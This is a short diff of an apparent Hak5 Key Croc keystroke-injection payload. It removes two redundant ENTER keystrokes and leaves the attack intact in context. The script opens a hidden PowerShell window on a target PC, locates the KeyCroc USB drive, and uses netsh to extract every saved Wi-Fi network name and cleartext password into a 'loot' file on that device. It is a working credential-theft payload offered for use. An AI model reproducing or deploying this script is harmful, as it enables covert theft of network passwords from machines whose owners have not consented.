@@ -18,12 +18,10 @@ sleep 1
 Q STRING "powershell -NoP -NonI -W Hidden"
 Q ENTER
 sleep 2
-Q ENTER
 # --> Get KeyCroc drive
 Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
 Q ENTER
 sleep 2
-Q ENTER
 # --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
 Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\loot\wifipass.txt\""
 Q ENTER
